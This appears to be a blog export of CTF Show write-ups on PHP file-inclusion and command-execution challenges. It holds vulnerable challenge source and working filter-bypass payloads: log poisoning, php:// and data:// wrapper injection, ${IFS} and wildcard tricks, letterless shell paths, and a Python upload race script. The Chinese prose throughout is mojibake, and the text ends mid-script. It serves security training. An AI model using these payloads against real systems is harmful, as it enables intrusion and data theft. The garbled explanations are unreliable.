åˆ†æï¼š 1# åœ¨æ¯æ¬¡ å†™æ–‡ä»¶ä¹‹å‰ä¹‹åï¼Œéƒ½ä¼šåˆ é™¤ é™¤äº† index.php ä¹‹å¤–çš„ä»»ä½•æ–‡ä»¶ è§£ä¸€ï¼šç›´æ¥åœ¨ index.php å½“ä¸­å†™å…¥ä»£ç  1# æ€»æ˜¯æˆåŠŸä¸äº† è§£äºŒï¼šæ¡ä»¶ç«äº‰ 11. å†™å…¥ ?ctf=1.phpshow=&lt;?php system(&#x27;ls /&#x27;); ?&gt;2. è®¿é—® /1.php3. äºŒè€…åŒæ—¶è¿›è¡Œçˆ†ç ´ 1.51 Web 150 â€”1å¯¹æˆ‘ä»¬ä»¥å‰çš„å†…å®¹è¿›è¡Œäº†å°ç»“ï¼Œæˆ‘ä»¬æ–‡ä»¶ä¸Šä¼ ç³»åˆ—å†è§ï¼ 1&lt;?phpinclude(&quot;flag.php&quot;);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123; private $username; private $password; private $vip; private $secret; function __construct()&#123; $this-&gt;vip = 0; $this-&gt;secret = $flag; &#125; function __destruct()&#123; echo $this-&gt;secret; &#125; public function isVIP()&#123; return $this-&gt;vip?TRUE:FALSE; &#125; &#125; function __autoload($class)&#123; if(isset($class))&#123; $class(); &#125;&#125;#è¿‡æ»¤å­—ç¬¦$key = $_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123; die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123; echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123; include($ctf);&#125; åˆ†æï¼š 1if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123; include($ctf);&#125;# 1.ä½¿ $isVIP = 1# 2.$ctf ä¸­ä¸èƒ½åŒ…å« : å†™å…¥æ—¥å¿— æ—¥å¿—åŒ…å« 1?isVIP=1ctf=/var/log/nginx/access.log&amp;a=system(&#x27;ls&#x27;); 1.52 Web 151 â€”1ä¿®å¤äº†éé¢„æœŸ 1&lt;?phpinclude(&quot;flag.php&quot;);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123; private $username; private $password; private $vip; private $secret; function __construct()&#123; $this-&gt;vip = 0; $this-&gt;secret = $flag; &#125; function __destruct()&#123; echo $this-&gt;secret; &#125; public function isVIP()&#123; return $this-&gt;vip?TRUE:FALSE; &#125; &#125; function __autoload($class)&#123; if(isset($class))&#123; $class(); &#125;&#125;#è¿‡æ»¤å­—ç¬¦$key = $_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123; die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123; echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE &amp;&amp; strrpos($ctf,&quot;log&quot;)===FALSE)&#123; include($ctf);&#125; è¿‡æ»¤äº† log sess æ–‡ä»¶åŒ…å« https://blog.csdn.net/miuzzx/article/details/109181768","categories":[{"name":"CTF Show","slug":"CTF-Show","permalink":"https://xizhi-future.github.io/categories/CTF-Show/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"}],"author":"xizhi-future"},{"title":"CTF-Show-å‘½ä»¤æ‰§è¡Œ","slug":"CTF-Show-å‘½ä»¤æ‰§è¡Œ","date":"2021-10-01T11:14:09.000Z","updated":"2021-10-01T11:14:51.490Z","comments":true,"path":"2021/10/01/CTF-Show-å‘½ä»¤æ‰§è¡Œ/","link":"","permalink":"https://xizhi-future.github.io/2021/10/01/CTF-Show-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"","text":"ä¸€ã€CTF Show â€” å‘½ä»¤æ‰§è¡Œ1.1 Web 29 â€” åªè¿‡æ»¤ flag â€” é€šé…ç¬¦ä½¿ç”¨1å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤ 12345678910&lt;?php error_reporting(0); if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1234#payload?c=phpinfo();?c=system(&#x27;ls&#x27;); #flag.php index.php ?c=system(&#x27;tac fl?g.php&#x27;); 1.2 Web 30 â€” è¿‡æ»¤ system() â€” å…¶å®ƒå‡½æ•°ä½¿ç”¨12345678910&lt;?php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1234?c=passthru(&#x27;ls&#x27;); #flag.php index.php ?c=passthru(&#x27;tac fl?g.?hp&#x27;);æˆ–è€…?c=passthru(&#x27;cat fl?g.?hp&#x27;); #ä¹‹åæŸ¥çœ‹æºä»£ç  1.3 Web 31 â€” è¿‡æ»¤éƒ¨åˆ† è¯»å– å‘½ä»¤12345678910&lt;?php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 123?c=passthru(&quot;ls&quot;); #flag.php index.php ?c=passthru(&quot;more%09f*&quot;);?c=passthru(&quot;tac%09f*&quot;); 1.4 Web 32 â€” è¿‡æ»¤ ; â€” PHP includeã€ä¼ªåè®® åˆ©ç”¨12345678910&lt;php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=include$_GET[&quot;a&quot;]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php 1.5 Web 33 â€” è¿‡æ»¤ ; â€” PHP includeã€ä¼ªåè®® åˆ©ç”¨1&lt;?php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\&quot;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php 1.6 Web 34 â€” è¿‡æ»¤ : â€” PHP includeã€ä¼ªåè®® åˆ©ç”¨1&lt;?php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php 1.7 Web 35 â€” è¿‡æ»¤ = â€” PHP includeã€ä¼ªåè®® åˆ©ç”¨1&lt;?php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php 1.8 Web 36 â€” è¿‡æ»¤ æ•°å­— [0-9]ã€/ â€” PHP includeã€ä¼ªåè®® åˆ©ç”¨1&lt;?php error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\:|\\&quot;|\\&lt;|\\=|\\/|[0-9]/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php 1.9 Web 37 â€” include â€” æ–‡ä»¶åŒ…å«ã€ä¼ªåè®®åˆ©ç”¨1&lt;?php //flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=data://text/plain,&lt;?php system(&#x27;ls&#x27;);?c=data://text/plain,&lt;?php system(&#x27;cat f*&#x27;); #æŸ¥çœ‹æºä»£ç  1.10 Web 38 â€” è¿‡æ»¤ phpâ€” æ–‡ä»¶åŒ…å«ã€ä¼ªåè®®data base64ç¼–ç åˆ©ç”¨1&lt;?php //flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=data://text/plain;base64,PD9waHAKc3lzdGVtKCd0YWMgZionKTs=#PD9waHAKc3lzdGVtKCd0YWMgZionKTs=è§£ç æ˜¯&lt;?phpsystem(&#x27;tac f*&#x27;); 1.11 Web 39 â€” .php åç¼€æˆªæ–­ â€” ?&gt;æ ‡ç­¾ //æ³¨é‡Šç¬¦ ç»•è¿‡1&lt;?php //flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; include($c.&quot;.php&quot;); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=data://text/plain,&lt;?php system(&#x27;ls&#x27;);// #flag.php index.php ?c=data://text/plain,&lt;?php system(&#x27;tac f*&#x27;);//æˆ–è€…æ˜¯?c=data://text/plain,&lt;?php system(&#x27;ls&#x27;);?&gt; #flag.php index.php .php?c=data://text/plain,&lt;?php system(&#x27;tac f*&#x27;);?&gt; 1.12 Web 40 â€” æ— å‚å‡½æ•°æ„é€ ï¼ˆå¥—å¨ƒï¼‰1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\ï¼ˆ|\\ï¼‰|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 1?c=print_r(scandir(current(localeconv()))); #Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php ) ?c=highlight_file(next(array_reverse(scandir(current(localeconv())))));#è¯»å–æ•°ç»„å€’æ•°ç¬¬äºŒä¸ªå…ƒç´ ï¼Œå¹¶ä½¿ç”¨é«˜äº®æ˜¾ç¤ºå‡ºæ¥ 1.13 Web 41 â€”è¿‡æ»¤ä¸ä¸¥ï¼Œå‘½ä»¤æ‰§è¡Œ 1&lt;?php if(isset($_POST[&#x27;c&#x27;]))&#123; $c = $_POST[&#x27;c&#x27;];if(!preg_match(&#x27;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i&#x27;, $c))&#123; eval(&quot;echo($c);&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; https://wp.ctf.show/d/137-ctfshow-web-web41 1.14 Web 42 â€” system &gt;/dev/null 2&gt;&amp;1 â€” %0a ç»•è¿‡1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls%0a #flag.php index.php ?c=tac flag.php%0a 1.15 Web 43 â€” system &gt;/dev/null 2&gt;&amp;1 â€” %26 ç»•è¿‡1&lt;?php 1?c=ls%26 #flag.php index.php ?c=tac flag.php%26 1.16 Web 44 â€” è¿‡æ»¤ flag â€” * ç»•è¿‡1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls%0a?c=tac f*%0a 1.17 Web 45 â€” è¿‡æ»¤ ç©ºæ ¼ â€” || ${IFS} ç»•è¿‡1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| /i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=tac%09f*||?c=tac$&#123;IFS&#125;f*||?c=tac$IFS$1f*|| 1.18 Web 46 â€” è¿‡æ»¤ * â€” ? ç»•è¿‡1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=tac%09fl?g.php|| 1.19 Web 47 â€” è¿‡æ»¤ * â€” ? ç»•è¿‡1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=tac%09f?ag.php 1.20 Web 48 â€” è¿‡æ»¤ * â€” ? ç»•è¿‡1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=tac%09f?ag.php 1.21 Web 49 â€” è¿‡æ»¤ * â€” ? ç»•è¿‡1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=tac%09f?ag.php 1.22 Web 50 â€” è¿‡æ»¤ é€šé…ç¬¦ â€” \\ &gt; &lt; ç»•è¿‡1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=nl&lt;fl\\ag.php||?c=nl&gt;fl\\ag.php||?c=nl&lt;&gt;fl\\ag.php||?c=vi&lt;fl\\ag.php||#è¯¥é¢˜ä½¿ç”¨é€šé…ç¬¦ä¸å¯è¡Œ 1.23 Web 51 â€” è¿‡æ»¤ ç©ºæ ¼ã€é€šé…ç¬¦ã€$ â€” \\ &gt; &lt; ç»•è¿‡1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls||?c=nl&lt;fl\\ag.php|| 1.24 Web 52 â€” è¿‡æ»¤ ç©ºæ ¼ã€é€šé…ç¬¦ã€&gt; &lt; â€” \\ $ ç»•è¿‡1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1#ç¦æ­¢äº†&lt; &gt;,åˆé‡Šæ”¾äº† $?c=ls|| #flag.php index.php ?c=nl$&#123;IFS&#125;fl\\ag.php|| #flag_hereï¼Œé”™è¯¯çš„flag?c=ls$&#123;IFS&#125;/|| #bin dev etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var ?c=nl$&#123;IFS&#125;/fl\\ag|| 1.25 Web 53 â€” system() â€” nl \\ ${IFS} ç»•è¿‡1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; echo($c); $d = system($c); echo &quot;&lt;br&gt;&quot;.$d; &#125;else&#123; echo &#x27;no&#x27;; &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls #lsflag.php index.php readflag readflag?c=nl$&#123;IFS&#125;fla\\g.php 1.26 Web 54 â€” system() â€” vi ${IFS} ? ç»•è¿‡1&lt;?php if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1?c=ls #flag.php index.php ?c=vi$&#123;IFS&#125;f???.????c=vi$&#123;IFS&#125;????.??? 1.27 Web 55 â€” è¿‡æ»¤ å­—æ¯ [a-z] â€” /bin/ + ? ç»•è¿‡1&lt;?php // ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; bin ä¸ºbinaryçš„ç®€å†™ï¼Œä¸»è¦æ”¾ç½®ä¸€äº›ç³»ç»Ÿçš„å¿…å¤‡æ‰§è¡Œæ¡£ä¾‹å¦‚:catã€cpã€chmod dfã€dmesgã€gzipã€killã€lsã€mkdirã€moreã€mountã€rmã€suã€tarã€base64ç­‰ã€‚æˆ‘ä»¬æ—¥å¸¸ç›´æ¥ä½¿ç”¨çš„catæˆ–è€…lsç­‰ç­‰éƒ½å…¶å®æ˜¯ç®€å†™ï¼Œä¾‹å¦‚lså®Œæ•´å…¨ç§°åº”è¯¥æ˜¯ /bin/lsæµ‹è¯•ï¼š 1touch flag.phpecho 123 &gt; flag.phpbase64 flag.php/bin/base64 flag.php 1# åˆ©ç”¨ /bin/ç›®å½•?c=/???/????64 ????.???# ?c=/bin/base64 flag.php 1# åˆ©ç”¨ /usr/bin/ç›®å½•# æˆ‘ä»¬å¯ä»¥åˆ©ç”¨/usr/binä¸‹çš„**bzip2**,å³ä¹Ÿå°±æ˜¯/usr/bin/bzip2 flag.php# æ„æ€å°±æ˜¯è¯´æˆ‘ä»¬å…ˆå°†flag.phpæ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œç„¶åå†å°†å…¶ä¸‹è½½?c=/???/???/????2 ????.???# ?c=/usr/bin/bzip2 flag.php# æŠŠflag.phpå‹ç¼©ï¼Œè®¿é—® url + flag.php.bz2 å°±å¯ä»¥æŠŠå‹ç¼©åçš„flag.phpç»™ä¸‹è½½ä¸‹æ¥ 1.28 Web 56 â€” è¿‡æ»¤ [a-z] [0-9] â€” POST åŒ…ç»•è¿‡ï¼ˆåˆ©ç”¨ . ?ï¼‰1&lt;?php// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|[0-9]|\\\\$|\\(|\\&#123;|\\&#x27;|\\&quot;|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; POST ä¸Šä¼ åŒ… 1å‘é€ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„POSTåŒ…ï¼Œæ­¤æ—¶PHPä¼šå°†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸‹ï¼Œé»˜è®¤çš„æ–‡ä»¶åæ˜¯/tmp/phpXXXXXXï¼Œæ–‡ä»¶åæœ€å6ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ã€‚å°†å‘½ä»¤å†™å…¥æ–‡ä»¶åï¼Œå¯ä»¥åˆ©ç”¨ç‚¹. æ¥æ‰§è¡Œæ–‡ä»¶ä¸­çš„å‘½ä»¤ï¼Œä¾‹å¦‚. fileã€‚ä¹Ÿå¯ä»¥source fileï¼Œä½†æ˜¯è¿™é¢˜è¿‡æ»¤äº†å­—æ¯ï¼Œå› æ­¤åªèƒ½ç”¨ç‚¹ã€‚å¦‚ä½•æ­£ç¡®åŒ¹é…åˆ°æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶å‘¢ï¼Ÿæ¢ç´¢è¿‡ç¨‹è§pç¥çš„æ–‡ç« ï¼Œæœ€åçš„åˆ©ç”¨æ˜¯/???/????????[@-[] æ–‡ä»¶ä¸Šä¼ çš„å‰ç«¯ 1&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;1&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;2&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;# æŠ“åŒ… ä¿®æ”¹æ–‡ä»¶å†…å®¹ä¸º å‘½ä»¤ https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html Python è„šæœ¬ 1import requestsurl = &#x27;http://57601c3a-595e-4ea4-a88c-61daa047e7b0.challenge.ctf.show:8080/&#x27;url += &#x27;?c=. /???/????????[@-[]&#x27;#æ„é€ urlwhile True: r = requests.post(url,files=&#123;&#x27;file&#x27;:(&quot;dota.txt&quot;,&quot;cat flag.php&quot;)&#125;)#ä»¥postè¿›è¡Œå‘åŒ… flag = r.text.split(&quot;ctfshow&quot;)#split() é€šè¿‡æŒ‡å®šåˆ†éš”ç¬¦å¯¹å­—ç¬¦ä¸²è¿›è¡Œåˆ‡ç‰‡ï¼Œå¦‚æœå‚æ•° num æœ‰æŒ‡å®šå€¼ï¼Œåˆ™åˆ†éš” num+1 ä¸ªå­å­—ç¬¦ä¸² if len(flag)&gt;1:#è¯´æ˜flagè·å¾—å€¼äº†ï¼ print(r.text)#æ‰“å°flag break#è·³å‡ºå¾ªç¯ 1.29 Web 57 â€” è¿‡æ»¤ [a-z] [0-9] . ? â€” å¼‚æˆ– $(())1&lt;?php// è¿˜èƒ½ç‚«çš„åŠ¨å—ï¼Ÿ//flag in 36.phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\&#x27;|\\&quot;|\\`|\\%|\\x09|\\x26|\\x0a|\\&gt;|\\&lt;|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i&quot;, $c))&#123; system(&quot;cat &quot;.$c.&quot;.php&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 1# . ? å‡è¢«è¿‡æ»¤ æ— å­—æ¯ã€æ•°å­—ç»ˆæç»•è¿‡ â€” å¼‚æˆ– åŒå°æ‹¬å· (( )) æ˜¯ Bash Shell ä¸­ä¸“é—¨ç”¨æ¥è¿›è¡Œ æ•´æ•°è¿ç®— çš„å‘½ä»¤ï¼Œå®ƒçš„æ•ˆç‡å¾ˆé«˜ï¼Œå†™æ³•çµæ´»ï¼Œæ˜¯ä¼ä¸šè¿ç»´ä¸­å¸¸ç”¨çš„è¿ç®—å‘½ä»¤ã€‚é€šä¿—åœ°è®²ï¼Œå°±æ˜¯å°†æ•°å­¦è¿ç®—è¡¨è¾¾å¼æ”¾åœ¨((å’Œ))ä¹‹é—´ã€‚ è¡¨è¾¾å¼å¯ä»¥åªæœ‰ä¸€ä¸ªï¼Œä¹Ÿå¯ä»¥æœ‰å¤šä¸ªï¼Œå¤šä¸ªè¡¨è¾¾å¼ä¹‹é—´ä»¥é€—å·,åˆ†éš”ã€‚å¯¹äºå¤šä¸ªè¡¨è¾¾å¼çš„æƒ…å†µï¼Œä»¥æœ€åä¸€ä¸ªè¡¨è¾¾å¼çš„å€¼ä½œä¸ºæ•´ä¸ª (( ))å‘½ä»¤çš„æ‰§è¡Œç»“æœã€‚ å¯ä»¥ ä½¿ç”¨$è·å– (( )) å‘½ä»¤çš„ç»“æœï¼Œè¿™å’Œä½¿ç”¨$è·å¾—å˜é‡å€¼æ˜¯ç±»ä¼¼çš„ã€‚ å¯ä»¥åœ¨ (( )) å‰é¢åŠ ä¸Š$ç¬¦å·è·å– (( )) å‘½ä»¤çš„æ‰§è¡Œç»“æœï¼Œä¹Ÿå³è·å–æ•´ä¸ªè¡¨è¾¾å¼çš„å€¼ã€‚ä»¥ c=$((a+b)) ä¸ºä¾‹ï¼Œå³å°† a+b è¿™ä¸ªè¡¨è¾¾å¼çš„è¿ç®—ç»“æœèµ‹å€¼ç»™å˜é‡ cã€‚ æ³¨æ„ï¼Œç±»ä¼¼ c=((a+b)) è¿™æ ·çš„å†™æ³•æ˜¯é”™è¯¯çš„ï¼Œä¸åŠ $å°±ä¸èƒ½å–å¾—è¡¨è¾¾å¼çš„ç»“æœã€‚ 1root@kali:~/æ¡Œé¢/è„šæœ¬# echo $(())0root@kali:~/æ¡Œé¢/è„šæœ¬# echo $((~$(())))-1root@kali:~/æ¡Œé¢/è„šæœ¬# echo $(( $((~$(()))) $((~$(()))) ))-2root@kali:~/æ¡Œé¢/è„šæœ¬# echo $(( $((~$(()))) + $((~$(()))) ))-2# æƒ³åŠæ³•æ„é€  36# å…³äºå–åï¼Œç»éªŒå°±æ˜¯å¦‚æœb=~aï¼Œé‚£ä¹ˆa+b=-1# payload?c=$((~$(( $((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))) )))) 1# å¼‚æˆ–è„šæœ¬ $(())# -*- coding: utf-8 -*-import redef write(): #preg = &#x27;[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\&#123;|\\&#125;|\\~|\\%|\\&amp;|\\;]+&#x27; preg = &quot;/[!@#%^&amp;*:&#x27;\\&quot;|`a-zA-BD-Z~\\\\\\\\]|[4-9]/&quot; str = &quot;&quot; for i in 